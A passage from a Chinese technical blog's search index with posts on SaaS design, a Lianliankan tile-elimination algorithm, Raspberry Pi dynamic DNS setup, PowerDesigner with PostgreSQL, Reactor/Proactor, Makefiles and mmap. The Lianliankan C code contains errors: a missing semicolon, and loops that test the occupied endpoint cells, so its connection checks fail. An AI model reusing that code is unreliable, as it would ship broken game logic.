RPC 协议实现，这样应用间可以通过统一的调用协议进行互调。当然，也可以通过 HTTP 来实现，这样限制更少一些，但平台对应用的管控也会更弱。 多租户多租户支持主要目的是简化应用开发，让应用可以全心全意关注业务逻辑而不是关注租户相关逻辑，具体细节请参考 这里。 开放平台前面我们提到过 SaaS 应该是可以接入其他 PaaS 应用的，这类应用我们可以认为是“外部应用”。既然是外部应用，那肯定是需要特定的接入规则，可以考虑参考行业标准规范。 OAuth通过该协议，SaaS 可以将服务（甚至是一些应用）暴露为 RESTful 接口给外部应用使用，这样可以充分利用平台的资源，吸引更多的应用进入到 SaaS 这个生态系统中。 分润最终买单的是用户，SaaS 平台和开发者是利益共同体，所以平台在指定规则时需要考虑好与开发者的分润。对于部署在 SaaS 内的应用和外部应用，分润规则应该是不一样的。下面是两种简单的方式： 内部应用：通过平台提供的支付接口进行分润，应用好卖，平台跟着受益 外部应用：应用支付给平台配额耗用费用，应用固定支付给平台其资源使用费用 总结SaaS 需要从至少两方面进行设计：基于特定的 PaaS；可以接入外部应用。自下而上、自上而下，包罗万象、井井有条。 平台最终比拼的是应用资源，而不是平台本身，尽可能吸引开发者是很重要的成功前提。要做到这一点，我们需要： 垂直领域（例如协同办公） 降低开发门槛（减少配置，轻量化 SDK） 概念具象化（例如多租户） 实现采用业界主流技术（Golang/Docker） 支持多种编程语言 活跃开发者社区","link":"/hexo-blog/2015/05/03/%E4%BA%91%E5%B9%B3%E5%8F%B0%E4%B9%8B-SaaS-%E9%9A%8F%E6%83%B3/"},{"title":"连连看游戏消除算法","text":"今天在收到一道的面试题，觉得比较有意思，决定记录下来，整个题目与解答过程大概如下。 连连看是一种很受大家欢迎的小游戏。下面四张图给出了最基本的消除规则： 图 A 中出现在同一直线上无障碍的圈圈可以消除；图 B 中两个圈圈可以通过一次转弯消除；图 C 和图 D 中，两个圈圈可以通过两次转弯消除。 已知以下接口，表示位置(x, y)上有无障碍物： 123int isBlocked(int x, int y);return 0; // 无障碍物（位置(x,y)为空）return 1; // 有障碍物（位置(x,y)上有方块或圈圈） 请写一个函数来判断给定的任意两个圈圈是否可消除（x1, y1与x2, y2为两个圈圈的位置）： 1int remove(int x1, int y1, int x2, int y2); 水平检测水平检测用来判断两个点的纵坐标是否相等，同时判断两点间有没有障碍物。 因此直接检测两点间是否有障碍物就可以了，代码如下： 12345678910111213141516171819202122232425static bool horizon(int x1, int y1, int x2, int y2){ if (x1 == x2 &amp;&amp; y1 == y2) { return false; } if (x1 != x2) { return false; } int start_y = std::min(y1, y2) int end_y = std::max(y1, y2); for (int j = start_y; j &lt; end_y; j++) { if (isBlocked(x1, j)) { return false; } } return true;} 垂直检测垂直检测用来判断两个点的横坐标是否相等，同时判断两点间有没有障碍物。 同样地，直接检测两点间是否有障碍物，代码如下： 12345678910111213141516171819202122232425static int vertical(int x1, int y1, int x2, int y2){ if (x1 == x2 &amp;&amp; y1 == y2) { return false; } if (y1 != y2) { return false; } int start_x = std::min(x1, x2); int end_x = std::max(x1, x2); for (int i = start_x; i &lt; end_x; i++) { if (isBlocked(i, y1)) { return false; } } return true;} 一个拐角检测一个拐角检测可分解为水平检测和垂直检测，当两个同时满足时，便两点可通过一个拐角相连。即： 一个拐角检测 = 水平检测 &amp;&amp; 垂直检测 A 点至 B 点能否连接可转化为满足任意一点： A 点至 C 点的垂直检测，以及 C 点至 B 点的水平检测； A 点至 D 点的水平检测，以及 D 点至 B 点的垂直检测。 代码如下： 123456789101112131415161718192021222324252627static int turn_once(int x1, int y1, int x2, int y2){ if (x1 == x2 &amp;&amp; y1 == y2) { return false; } int c_x = x1, c_y = y2; int d_x = x2, d_y = y1; int ret = false; if (!isBlocked(c_x, c_y)) { ret |= horizon(x1, y1, c_x, c_y) &amp;&amp; vertical(c_x, c_y, x2, y2); } if (!isBlocked(d_x, d_y)) { ret |= horizon(x1, y1, d_x, d_y) &amp;&amp; vertical(d_x, d_y, x2, y2); } if (ret) { return true; } return false;} 两个拐角检测两个拐角检测可分解为一个拐角检测和水平检测或垂直检测。即： 两个拐角检测 = 一个拐角检测 &amp;&amp; (水平检测 || 垂直检测) 如图，水平、垂直分别穿过 A B 共有四条直线，扫描直线上所有不包含 A B 的点，看是否存在一点 C ，满足以下任意一项： A 点至 C 点通过水平或垂直检测，C 点至 B 点可通过一个拐角连接。（图中用 C 表示） A 点至 C 点可通过一个拐角连接，C 点至 B 点通过水平或垂直连接。（图中用 C 下划线表示） 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940static int turn_twice(int x1, int y1, int x2, int y2){ if (x1 == x2 &amp;&amp; y1 == y2) { return false; } for (int i = 0; i &lt;= MAX_X; i++) { for (int j = 0; j &lt;= MAX_Y; j++) { if (i != x1 &amp;&amp; i != x2 &amp;&amp; j != y1 &amp;&amp; j != y2) { continue; } if ((i == x1 &amp;&amp; j == y1) || (i == x2 &amp;&amp; j == y2)) { continue; } if (isBlocked(i, j)) { continue; } if (turn_once(x1, y1, i, j) &amp;&amp; (horizon(i, j, x2, y2) || vertical(i, j, x2, y2))) { return true; } if (turn_once(i, j, x2, y2) &amp;&amp; (horizon(x1, y1, i, j) || vertical(x1, y1, i, j))) { return true; } } } return false;} 整合最后，整合以上四种情况，判断两点是否能消除的代码可以写成： 123456789101112131415161718192021222324252627int remove(int x1, int y1, int x2, int y2){ int ret = false; ret = horizon(x1, y1, x2, y2); if (ret) { return 1; } ret = vertical(x1, y1, x2, y2); if (ret) { return 1; } ret = turn_once(x1, y1, x2, y2); if (ret) { return 1; } ret = turn_twice(x1, y1, x2, y2); if (ret) { return 1; } return 0;}","link":"/hexo-blog/2015/07/21/%E8%BF%9E%E8%BF%9E%E7%9C%8B%E6%B8%B8%E6%88%8F%E6%B6%88%E9%99%A4%E7%AE%97%E6%B3%95/"},{"title":"树莓派安装花生壳（动态 DNS）服务","text":"下载首先，下载花生壳 linux 版 phddns-2.0.2.16556.tar.gz 并解压： 12wget http://download.oray.com/peanuthull/phddns-2.0.2.16556.tar.gztar -zxf phddns-2.0.2.16556.tar.gz 编译进入目录，编译： 123cd phddns-2.0.2.16556./configuremake 编译后生成会在 src 目录生成可执行文件 phddns。 123cd srcls -l phddns-rwxr-xr-x 1 root root 38880 Oct 14 16:04 phddns 运行执行编译好的程序并配置（默认使用/etc/phlinux.conf，如果不存在这个文件则自动进入交互配置）： 1./phddns 根据提示配置后，程序将以交互模式开始运行。按 Ctrl + C 终止运行。 将 phddns 拷贝到你希望的位置： 1cp phddns /usr/local/bin/ 以 daemon 模式启动花生壳： 1234567891011121314/usr/local/bin/phddns -c /etc/phlinux.conf -dphlinux started as daemon!# tail /var/log/phddns.logWed Oct 14 16:06:20 2015| ExecuteUpdate Connecting PhLinux3.Oray.Net.Wed Oct 14 16:06:20 2015| SEND AUTH REQUEST COMMAND...Wed Oct 14 16:06:20 2015| OK.Wed Oct 14 16:06:20 2015| SERVER SIDE KEY &quot;334 ************************&quot; RECEIVED.Wed Oct 14 16:06:20 2015| SEND AUTH DATA...Wed Oct 14 16:06:20 2015| OKWed Oct 14 16:06:21 2015| Need redirect, waiting for 5 seconds...Wed Oct 14 16:06:26 2015| ExecuteUpdate Connecting phent-std.oray.net.Wed Oct 14 16:06:26 2015| SEND AUTH REQUEST COMMAND...Wed Oct 14 16:06:26 2015| OK.Wed Oct 14 16:06:26 2015| SERVER SIDE KEY &quot;334 ************************&quot; RECEIVED.Wed Oct 14 16:06:26 2015| SEND AUTH DATA...Wed Oct 14 16:06:26 2015| OKWed Oct 14 16:06:26 2015| ExecuteUpdate domain &quot;******.gicp.net&quot; 查看进程 ID： 12ps -A | grep phddns239 ? 00:00:01 phddns 让后台进程退出： 1kill 239 添加自启动因为笔者的树莓派安装的是 archlinux，使用了 systemd，因此需要手动添加 phddns 服务实现自启。（当然添加命令至 rc.local 文件也可以，但已不推荐使用，如果有兴趣可以百度一下具体方法。） 1vim /etc/systemd/system/phddns.service 输入以下内容并保存，用来添加服务。 123456789101112131415[Unit]Description=phddns serviceAfter=syslog.target network.target[Service]Type=oneshotRemainAfterExit=yesExecStart=/usr/local/bin/phddns -c /etc/phlinux.conf -dExecReload=/usr/bin/kill -HUP $MAINPIDKillSignal=SIGQUITKillMode=mixed[Install]WantedBy=multi-user.target 然后启动该服务： 1systemctl start phddns 使用 ps 查看是否运行成功，如果成功，将其设置为开机自启动： 1systemctl enable phddns","link":"/hexo-blog/2015/10/14/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85%E8%8A%B1%E7%94%9F%E5%A3%B3%EF%BC%88%E5%8A%A8%E6%80%81%20DNS%EF%BC%89%E6%9C%8D%E5%8A%A1/"},{"title":"各种相纸比较","text":"最近在某宝上用不同相纸冲印了一些照片，觉得效果还是有一些差异的，现在具体对比一下，以供各位朋友日后参考，同时也作为自己的一个记录。 第一次冲洗我使用了【富士晶彩光面】、【富士金冠绒面】和【柯达皇家绒面】这三种类型的相纸。 首先介绍一下光面与绒面的区别： 光面看起来更加鲜艳亮丽，但是容易留下指纹和划痕，因此个人认为适合风景等需要对色彩表现较高的照片。 绒面看起来柔和一些，更高档，但是有颗粒感，因此个人认为适合人像，静物等对局部细节要求较高的照片。 其次，富士相纸和柯达相纸在色彩表现上的区别有： 富士相纸对冷色调的表现更好，因此更适合风景等。 柯达相纸对暖色调的表现更好，因此更适合人像等。 最后，说一下这三种相纸的区别： 【富士晶彩光面】厚度最薄，但很有弹性。 【富士金冠绒面】和【柯达皇家绒面】这两种虽然都是绒面，但是也有细微区别： 【富士金冠绒面】的颗粒感较小，对光线的反射不太明显，厚度一般。 【柯达皇家绒面】的颗粒感较大，对光线的反射更明显，更厚一些。","link":"/hexo-blog/2015/10/15/%E5%90%84%E7%A7%8D%E7%9B%B8%E7%BA%B8%E6%AF%94%E8%BE%83/"},{"title":"Power Designer 连接 PostgreSQL 逆向工程若干问题解决笔记","text":"首先说说系统环境，Windows 7 64 位系统，PowerDesigner 16.5，远程 PostgreSQL 9.4 数据库，JDK 为 64 位的 Java 8。 笔者依次点击： Database-&gt;Configure Connections...-&gt;Connection Profiles-&gt;Add Datasource 输入以下配置： 1234Connection type: JDBCDBMS type: PostgreSQLJDBC driver class: org.postgresql.DriverJDBC connection URL: jdbc:postgresql://&lt;your_host&gt;:5432/&lt;your_database&gt; 但是点击 Test connection 时出现了问题。 Could not Initialize JavaVM!原因分析这个原因很简单，笔者安装的是 64 位的 JDK 和 JRE，而 Power Designer 是 32 位的，其 JDBC 无法在 64 位的 Java 虚拟机上运行。 解决从 Oracle 官网上下载 32 位的 JDK，安装时不要自动配置环境变量，因为笔者系统里的其他程序还要运行在 64 位虚拟机上，能不能只让 Power Designer 在 32 位虚拟机上运行呢？下一步将完美解决这个问题。 Non SQL Error : Could not load class org.postgresql.Driver原因分析原因是找不到 PostgreSQL 的 Java 驱动。 解决访问 http://jdbc.postgresql.org/download.html，下载对应的 jar 包（笔者下载的是 postgresql-9.4.1208.jar）。 将下载下来的 jar 包放入某个目录，笔者放在了 D:\\Tools\\Sybase\\PowerDesigner 16\\SQL Anywhere 12 drivers 这个目录，当然你可以放到任意目录。 然后在 Power Designer 安装目录新建一个 PowerDesigner.bat 文件，输入以下内容： 12345set JAVA_HOME=&quot;C:\\Program Files (x86)\\Java\\jdk1.8.0_77&quot;set CLASSPATH=&quot;%JAVA_HOME%\\lib\\jt.jar;%JAVA_HOME%\\lib\\tools.jar;D:\\Tools\\Sybase\\PowerDesigner 16\\SQL Anywhere 12 drivers\\postgresql-9.4.1208.jar&quot;cd &quot;D:\\Tools\\Sybase\\PowerDesigner 16&quot;start /b PdShell16.exeexit 其中 JAVA_HOME 是上一步安装的 32 位 JDK 的目录，CLASSPATH 包含那个 postgresql 的 Java 驱动 jar 包。 保存后，右键发送到桌面快捷方式即可，也可以给它换个图标，以后运行时双击这个快捷方式就可以了。 Unable to list the columns. SQLSTATE = 22003不良的类型值 short : t然而成功连接数据库后建模时出现了“不良的类型值问题”，解决方法如下： 依次点击 Database-&gt;Edit Current DBMS...-&gt;General Tab-&gt;PostgreSQL 9.x-&gt;Script-&gt;Objects 或者 Tools-&gt;Edit Current DBMS-&gt;PostgreSQL 9.x-&gt;Script-&gt;Objects 将 Column-&gt;SqlListQuery 选项里 SELECT 中的 c.attnotnull 替换为 cast(nullif(c.attnotnull, false) as varchar(1)) 将 Key-&gt;SqlListQuery 选项里 SELECT 中的 x.indisprimary 替换为 cast(nullif(x.indisprimary, false) as varchar(1)) 保存即可。 参考文章： 用PowerDesigner远程连接PostgreSQL数据库 PowerDesigner 16.5 反向PostgreSQL9.01 中 Unable to list the columns. SQLSTATE = 22003不良的类型值 short : t 解决方法","link":"/hexo-blog/2016/04/13/Power%20Designer%20%E8%BF%9E%E6%8E%A5%20PostgreSQL%20%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"},{"title":"IO 设计模式：Reactor 和 Proactor 对比","text":"原文地址：https://segmentfault.com/a/1190000002715832Posted by: 大CC | 28APR,2015博客：blog.me115.com [订阅]微博：新浪微博 平时接触的开源产品如Redis、ACE，事件模型都使用的Reactor模式；而同样做事件处理的Proactor，由于操作系统的原因，相关的开源产品也少；这里学习下其模型结构，重点对比下两者的异同点； 反应器ReactorReactor模式结构 Reactor包含如下角色： Handle 句柄；用来标识socket连接或是打开文件； Synchronous Event Demultiplexer：同步事件多路分解器：由操作系统内核实现的一个函数；用于阻塞等待发生在句柄集合上的一个或多个事件；（如select/epoll；） Event Handler：事件处理接口 Concrete Event HandlerA：实现应用程序所提供的特定事件处理逻辑； Reactor：反应器，定义一个接口，实现以下功能： 供应用程序注册和删除关注的事件句柄； 运行事件循环； 有就绪事件到来时，分发事件到之前注册的回调函数上处理； “反应”器名字中”反应“的由来： “反应”即“倒置”，“控制逆转” 具体事件处理程序不调用反应器，而是由反应器分配一个具体事件处理程序，具体事件处理程序对某个指定的事件发生做出反应；这种控制逆转又称为“好莱坞法则”（不要调用我，让我来调用你） 业务流程及时序图 应用启动，将关注的事件handle注册到Reactor中； 调用Reactor，进入无限事件循环，等待注册的事件到来； 事件到来，select返回，Reactor将事件分发到之前注册的回调函数中处理； Proactor模式Proactor模式结构 Proactor主动器模式包含如下角色 Handle 句柄；用来标识socket连接或是打开文件； Asynchronous Operation Processor：异步操作处理器；负责执行异步操作，一般由操作系统内核实现； Asynchronous Operation：异步操作 Completion Event Queue：完成事件队列；异步操作完成的结果放到队列中等待后续使用 Proactor：主动器；为应用程序进程提供事件循环；从完成事件队列中取出异步操作的结果，分发调用相应的后续处理逻辑； Completion Handler：完成事件接口；一般是由回调函数组成的接口； Concrete Completion Handler：完成事件处理逻辑；实现接口定义特定的应用处理逻辑； 业务流程及时序图 应用程序启动，调用异步操作处理器提供的异步操作接口函数，调用之后应用程序和异步操作处理就独立运行；应用程序可以调用新的异步操作，而其它操作可以并发进行； 应用程序启动Proactor主动器，进行无限的事件循环，等待完成事件到来； 异步操作处理器执行异步操作，完成后将结果放入到完成事件队列； 主动器从完成事件队列中取出结果，分发到相应的完成事件回调函数处理逻辑中； 对比两者的区别主动和被动以主动写为例： Reactor将handle放到select()，等待可写就绪，然后调用write()写入数据；写完处理后续逻辑； Proactor调用aoi_write后立刻返回，由内核负责写操作，写完后调用相应的回调函数处理后续逻辑； 可以看出，Reactor被动的等待指示事件的到来并做出反应；它有一个等待的过程，做什么都要先放入到监听事件集合中等待handler可用时再进行操作； Proactor直接调用异步读写操作，调用完后立刻返回； 实现Reactor实现了一个被动的事件分离和分发模型，服务等待请求事件的到来，再通过不受间断的同步处理事件，从而做出反应； Proactor实现了一个主动的事件分离和分发模型；这种设计允许多个任务并发的执行，从而提高吞吐量；并可执行耗时长的任务（各个任务间互不影响） 优点Reactor实现相对简单，对于耗时短的处理场景处理高效； 操作系统可以在多个事件源上等待，并且避免了多线程编程相关的性能开销和编程复杂性； 事件的串行化对应用是透明的，可以顺序的同步执行而不需要加锁； 事务分离：将与应用无关的多路分解和分配机制和与应用相关的回调函数分离开来， Proactor性能更高，能够处理耗时长的并发场景； 缺点Reactor处理耗时长的操作会造成事件分发的阻塞，影响到后续事件的处理； Proactor实现逻辑复杂；依赖操作系统对异步的支持，目前实现了纯异步操作的操作系统少，实现优秀的如windows IOCP，但由于其windows系统用于服务器的局限性，目前应用范围较小；而Unix/Linux系统对纯异步的支持有限，应用事件驱动的主流还是通过select/epoll来实现； 适用场景Reactor：同时接收多个服务请求，并且依次同步的处理它们的事件驱动程序； Proactor：异步接收和同时处理多个服务请求的事件驱动程序； 参考《面向模式的软件体系结构 卷2》《面向模式的软件架构 卷4》","link":"/hexo-blog/2016/09/08/IO-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9AReactor-%E5%92%8C-Proactor-%E5%AF%B9%E6%AF%94/"},{"title":"Makefile 简易教程","text":"Makefile 简介在软件开发中，make通常被视为一种软件构建工具。该工具主要经由读取一种名为“makefile”或“Makefile”的文件来实现软件的自动化建构。它会通过一种被称之为“target”概念来检查相关文件之间的依赖关系，这种依赖关系的检查系统非常简单，主要通过对比文件的修改时间来实现。在大多数情况下，我们主要用它来编译源代码，生成结果代码，然后把结果代码连接起来生成可执行文件或者库文件。 优点与缺点与大多数古老的Unix工具一样，make也分别有着人数众多的拥护者和反对者。它在适应现代大型软件项目方面有着许许多多的问题。但是，依然有很多人坚定地认为（包括我）它能应付绝大多数常见的情况，而且使用非常的简单，功能强大，表达清楚。无论如何，make如今仍然被用来编译很多完整的操作系统，而且它的那些“更为现代”的替代品们在基本操作上与它没有太大差别。 当然，随着现代的集成开发环境（IDE）的诞生，特别是非Unix的平台上，很多程序员不再手动管理依靠关系检查，甚至不用去管哪些文件是这个项目的一部分，而是把这些任务交给了他们的开发环境去做。类似的，很多现代的编程语言有自己专属的、能高效配置依赖关系的方法（譬如Ant）。 主要版本make程序经历过各方多次的改写与重写，各方都依据自己的需要做了一些特定的改良。目前市面上主要流行有以下几种版本： GNU make： GNU make对make的标准功能（通过clean-room工程）进行了重新改写，并加入作者自认为值得加入的新功能，常和GNU编译系统一起被使用，是大多数GNU Linux默认安装的工具。 BSD make： 该版本是从Adam de Boor制作的版本上发展起来的。它在编译目标的时有并发计算的能力。主要应用于FreeBSD，NetBSD和OpenBSD这些系统。 Microsoft nmake： 该版本主要用于微软的Windows系统中，需要注意的是，微软的nmake与Unix项目中的nmake是两种不同的东西，千万不要混淆。 从一个简单的例子开始我们可以用K&amp;R C中4.5那个例子来做个说明。在这个例子中，我们会看到一份主程序代码 main.c、三份函数代码 getop.c、stack.c、getch.c以及一个头文件 calc.h。通常情况下，我们需要这样编译它： 1gcc -o calc main.c getch.c getop.c stack.c 如果没有makefile，在开发+调试程序的过程中，我们就需要不断地重复输入上面这条编译命令，要不就是通过终端的历史功能不停地按上下键来寻找最近执行过的命令。这样做两个缺陷： 一旦终端历史记录被丢失，我们就不得不从头开始； 任何时候只要我们修改了其中一个文件，上述编译命令就会重新编译所有的文件，当文件足够多时这样的编译会非常耗时。 那么 Makefile 又能做什么呢？我们先来看一个最简单的 makefile 文件： 12calc: main.c getch.c getop.c stack.c gcc -o calc main.c getch.c getop.c stack.c 现在你看到的就是一个最基本的Makefile语句，它主要分成了三个部分，第一行冒号之前的 calc，我们称之为目标（target），被认为是这条语句所要处理的对象，具体到这里就是我们所要编译的这个程序 calc。冒号后面的部分（main.c getch.c getop.c stack.c），我们称之为依赖关系表，也就是编译calc所需要的文件，这些文件只要有一个发生了变化，就会触发该语句的第三部分，我们称其为命令部分，相信你也看得出这就是一条编译命令。现在我们只要将上面这两行语句写入一个名为Makefile或者makefile的文件，然后在终端中输入make命令，就会看到它按照我们的设定去编译程序了。 请注意，在第二行的“gcc”命令之前必须要有一个tab缩进。语法规定Makefile中的任何命令之前都必须要有一个tab缩进，否则make就会报错。 接下来，让我们来解决一下效率方面的问题，先初步修改一下上面的代码： 123456cc = gccprom = calcsource = main.c getch.c getop.c stack.c$(prom): $(source) $(CC) -o $(prom) $(source) 如你所见，我们在上述代码中定义了三个常量 cc、prom 以及 source。它们分别告诉了make我们要使用的编译器、要编译的目标以及源文件。这样一来，今后我们要修改这三者中的任何一项，只需要修改常量的定义即可，而不用再去管后面的代码部分了。 请注意，很多教程将这里的 cc、prom 和 source 称之为变量，个人认为这是不妥当的，因为它们在整个文件的执行过程中并不是可更改的，作用也仅仅是字符串替换而已，非常类似于C语言中的宏定义。或者说，事实上它就是一个宏。 但我们现在依然还是没能解决当我们只修改一个文件时就要全部重新编译的问题。而且如果我们修改的是 calc.h 文件，make就无法察觉到变化了（所以有必要为头文件专门设置一个常量，并将其加入到依赖关系表中）。下面，我们来想一想如何解决这个问题。考虑到在标准的编译过程中，源文件往往是先被编译成目标文件，然后再由目标文件连接成可执行文件的。我们可以利用这一点来调整一下这些文件之间的依赖关系： 12345678910111213141516171819cc = gccprom = calcdeps = calc.hobj = main.o getch.o getop.o stack.o$(prom): $(obj) $(CC) -o $(prom) $(obj)main.o: main.c $(deps) $(CC) -c main.cgetch.o: getch.c $(deps) $(CC) -c getch.cgetop.o: getop.c $(deps) $(CC) -c getop.cstack.o: stack.c $(deps) $(CC) -c stack.c 这样一来，上面的问题显然是解决了，但同时我们又让代码变得非常啰嗦，啰嗦往往伴随着低效率，是不祥之兆。经过再度观察，我们发现所有.c都会被编译成相同名称的 .o 文件。我们可以根据该特点再对其做进一步的简化： 12345678910cc = gccprom = calcdeps = calc.hobj = main.o getch.o getop.o stack.o$(prom): $(obj) $(CC) -o $(prom) $(obj)%.o: %.c $(deps) $(CC) -c $&lt; -o $@ 在这里，我们用到了几个特殊的宏。首先是 %.o:%.c，这是一个模式规则，表示所有的.o目标都依赖于与它同名的 .c 文件（当然还有deps中列出的头文件）。再来就是命令部分的 $&lt; 和 $@，其中$&lt;代表的是依赖关系表中的第一项（如果我们想引用的是整个关系表，那么就应该使用 $^），具体到我们这里就是%.c。而$@代表的是当前语句的目标，即 %.o。这样一来，make命令就会自动将所有的 .c 源文件编译成同名的 .o 文件。不用我们一项一项去指定了。整个代码自然简洁了许多。 到目前为止，我们已经有了一个不错的makefile，至少用来维护这个小型工程是没有什么问题了。当然，如果要进一步增加上面这个项目的可扩展性，我们就会需要用到一些Makefile中的伪目标和函数规则了。例如，如果我们想增加自动清理编译结果的功能就可以为其定义一个带伪目标的规则； 12345678910111213cc = gccprom = calcdeps = calc.hobj = main.o getch.o getop.o stack.o$(prom): $(obj) $(CC) -o $(prom) $(obj)%.o: %.c $(deps) $(CC) -c $&lt; -o $@clean: rm -rf $(obj) $(prom) 有了上面最后两行代码，当我们在终端中执行 make clean 命令时，它就会去删除该工程生成的所有编译文件。 另外，如果我们需要往工程中添加一个 .c 或 .h，可能同时就要再手动为 obj 常量再添加第一个 .o 文件，如果这列表很长，代码会非常难看，为此，我们需要用到Makefile中的函数，这里我们演示两个： 1234567891011121314cc = gccprom = calcdeps = $(shell find ./ -name &quot;*.h&quot;)src = $(shell find ./ -name &quot;*.c&quot;)obj = $(src:%.c=%.o) $(prom): $(obj) $(CC) -o $(prom) $(obj)%.o: %.c $(deps) $(CC) -c $&lt; -o $@clean: rm -rf $(obj) $(prom) 其中，shell 函数主要用于执行shell命令，具体到这里就是找出当前目录下所有的 .c 和 .h 文件。而 $(src:%.c=%.o) 则是一个字符替换函数，它会将 src 所有的 .c 字串替换成 .o，实际上就等于列出了所有 .c 文件要编译的结果。有了这两个设定，无论我们今后在该工程加入多少 .c 和 .h 文件，Makefile都能自动将其纳入到工程中来。 到这里，我们就基本上将日常会用到的Makefile写法介绍了一遍。如果你想了解更多关于makefile和make的知识，请参考 GNU Make Manual。 原文地址：http://www.epubit.com.cn/article/546","link":"/hexo-blog/2016/09/08/Makefile%20%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"title":"mmap 详解","text":"共享内存可以说是最有用的进程间通信方式，也是最快的 IPC 形式, 因为进程可以直接读写内存，而不需要任何数据的拷贝。对于像管道和消息队列等通信方式，则需要在内核和用户空间进行四次的数据拷贝，而共享内存则只拷贝两次数据: 一次从输入文件到共享内存区，另一次从共享内存区到输出文件。实际上，进程之间在共享内存时，并不总是读写少量数据后就解除映射，有新的通信时，再重新建立共享内存区域。而是保持共享区域，直到通信完毕为止，这样，数据内容一直保存在共享内存中，并没有写回文件。共享内存中的内容往往是在解除映射时才写回文件的。因此，采用共享内存的通信方式效率是非常高的。 一、传统文件访问UNIX访问文件的传统方法是用 open 打开它们, 如果有多个进程访问同一个文件，则每一个进程在自己的地址空间都包含有该文件的副本，这不必要地浪费了存储空间。下图说明了两个进程同时读一个文件的同一页的情形。系统要将该页从磁盘读到高速缓冲区中，每个进程再执行一个存储器内的复制操作将数据从高速缓冲区读到自己的地址空间。 二、共享存储映射现在考虑另一种处理方法：进程 A 和进程 B 都将该页映射到自己的地址空间，当进程 A 第一次访问该页中的数据时，它生成一个缺页中断。内核此时读入这一页到内存并更新页表使之指向它。以后，当进程 B 访问同一页面而出现缺页中断时，该页已经在内存，内核只需要将进程 B 的页表登记项指向次页即可。如下图所示： 三、mmap() 及其相关系统调用mmap() 系统调用使得进程之间通过映射同一个普通文件实现共享内存。普通文件被映射到进程地址空间后，进程可以向访问普通内存一样对文件进行访问，不必再调用 read()，write()等操作。 mmap() 系统调用形式如下： 1void* mmap(void* addr, size_t len, int prot, int flags, int fd, off_t offset) mmap 的作用是映射文件描述符 fd 指定文件的 [off, off+len] 区域至调用进程的 [addr, addr+len] 的内存区域, 如下图所示: 参数 fd 为即将映射到进程空间的文件描述字，一般由 open() 返回，同时，fd 可以指定为 -1，此时须指定 flags 参数中的 MAP_ANON，表明进行的是匿名映射（不涉及具体的文件名，避免了文件的创建及打开，很显然只能用于具有亲缘关系的进程间通信）。len 是映射到调用进程地址空间的字节数，它从被映射文件开头 offset 个字节开始算起。prot 参数指定共享内存的访问权限。可取如下几个值的或：PROT_READ（可读），PROT_WRITE（可写），PROT_EXEC（可执行），PROT_NONE（不可访问）。flags 由以下几个常值指定：MAP_SHARED, MAP_PRIVATE, MAP_FIXED，其中，MAP_SHARED, MAP_PRIVATE 必选其一，而 MAP_FIXED 则不推荐使用。offset 参数一般设为 0，表示从文件头开始映射。参数 addr 指定文件应被映射到进程空间的起始地址，一般被指定一个空指针，此时选择起始地址的任务留给内核来完成。函数的返回值为最后文件映射到进程空间的地址，进程可直接操作起始地址为该值的有效地址。 四、mmap的两个例子范例中使用的测试文件 data.txt： 1234aaaaaaaaabbbbbbbbbcccccccccddddddddd 通过共享映射的方式修改文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;error.h&gt;#define BUF_SIZE 100int main(int argc, char **argv){ int fd, nread, i; struct stat sb; char *mapped, buf[BUF_SIZE]; for (i = 0; i &lt; BUF_SIZE; i++) { buf[i] = '#'; } /* 打开文件 */ if ((fd = open(argv[1], O_RDWR)) &lt; 0) { perror(&quot;open&quot;); } /* 获取文件的属性 */ if ((fstat(fd, &amp;sb)) == -1) { perror(&quot;fstat&quot;); } /* 将文件映射至进程的地址空间 */ if ((mapped = (char *)mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == (void *)-1) { perror(&quot;mmap&quot;); } /* 映射完后, 关闭文件也可以操纵内存 */ close(fd); printf(&quot;%s&quot;, mapped); /* 修改一个字符,同步到磁盘文件 */ mapped[20] = '9'; if ((msync((void *)mapped, sb.st_size, MS_SYNC)) == -1) { perror(&quot;msync&quot;); } /* 释放存储映射区 */ if ((munmap((void *)mapped, sb.st_size)) == -1) { perror(&quot;munmap&quot;); } return 0;} 私有映射无法修改文件 12345/* 将文件映射至进程的地址空间 */if ((mapped = (char *)mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == (void *)-1) { perror(&quot;mmap&quot;);} 五、使用共享映射实现两个进程之间的通信两个程序映射同一个文件到自己的地址空间，进程 A 先运行, 每隔两秒读取映射区域，看是否发生变化。进程 B 后运行，它修改映射区域，然后退出，此时进程 A 能够观察到存储映射区的变化。进程 A 的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;error.h&gt;#define BUF_SIZE 100int main(int argc, char **argv){ int fd, nread, i; struct stat sb; char *mapped, buf[BUF_SIZE]; for (i = 0; i &lt; BUF_SIZE; i++) { buf[i] = '#'; } /* 打开文件 */ if ((fd = open(argv[1], O_RDWR)) &lt; 0) { perror(&quot;open&quot;); } /* 获取文件的属性 */ if ((fstat(fd, &amp;sb)) == -1) { perror(&quot;fstat&quot;); } /* 将文件映射至进程的地址空间 */ if ((mapped = (char *)mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == (void *)-1) { perror(&quot;mmap&quot;); } /* 文件已在内存, 关闭文件也可以操纵内存 */ close(fd); /* 每隔两秒查看存储映射区是否被修改 */ while (1) { printf(&quot;%s\\n&quot;, mapped); sleep(2); } return 0;} 进程 B 的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;sys/mman.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include 